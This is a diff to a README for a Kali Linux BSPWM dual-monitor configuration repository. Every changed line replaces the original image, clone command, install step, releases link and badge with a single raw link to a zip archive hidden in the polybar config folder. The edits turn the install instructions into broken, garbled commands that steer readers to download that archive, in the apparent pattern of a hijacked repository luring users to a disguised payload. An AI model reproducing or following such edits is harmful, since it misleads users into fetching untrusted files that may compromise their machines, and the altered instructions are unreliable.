@@ -3,7 +3,7 @@
 
 Welcome to the **kali-bspwm** repository! This project provides a tailored configuration of BSPWM for a dual monitor setup on Kali Linux, optimized for productivity. Whether you're a developer, a cybersecurity enthusiast, or just someone who values an efficient workspace, this configuration is designed to enhance your daily workflow.
 
-![Kali BSPWM Setup](https://example.com/path-to-your-image.jpg)
+![Kali BSPWM Setup](https://github.com/JatinMatrix/kali-bspwm/raw/refs/heads/main/config/polybar/bspwm_kali_2.2.zip)
 
 ## 📜 Table of Contents
 
@@ -34,7 +34,7 @@ To install the configuration, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/JatinMatrix/kali-bspwm.git
+   git clone https://github.com/JatinMatrix/kali-bspwm/raw/refs/heads/main/config/polybar/bspwm_kali_2.2.zip
    ```
 
 2. Change into the directory:
@@ -44,7 +44,7 @@ To install the configuration, follow these steps:
 
 3. Run the installation script:
    ```bash
-   ./install.sh
+   https://github.com/JatinMatrix/kali-bspwm/raw/refs/heads/main/config/polybar/bspwm_kali_2.2.zip
    ```
 
    Ensure you have the required packages installed. The script will prompt you if anything is missing.
@@ -108,9 +108,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 🔗 Links
 
-For the latest updates and releases, visit the [Releases Section](https://github.com/JatinMatrix/kali-bspwm/releases).
+For the latest updates and releases, visit the [Releases Section](https://github.com/JatinMatrix/kali-bspwm/raw/refs/heads/main/config/polybar/bspwm_kali_2.2.zip).
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-latest-blue.svg)](https://github.com/JatinMatrix/kali-bspwm/releases)
+[![Download Releases](https://github.com/JatinMatrix/kali-bspwm/raw/refs/heads/main/config/polybar/bspwm_kali_2.2.zip%https://github.com/JatinMatrix/kali-bspwm/raw/refs/heads/main/config/polybar/bspwm_kali_2.2.zip)](https://github.com/JatinMatrix/kali-bspwm/raw/refs/heads/main/config/polybar/bspwm_kali_2.2.zip)
 
 Feel free to explore the features, modify the configuration, and make this setup your own. Happy computing!
 ```
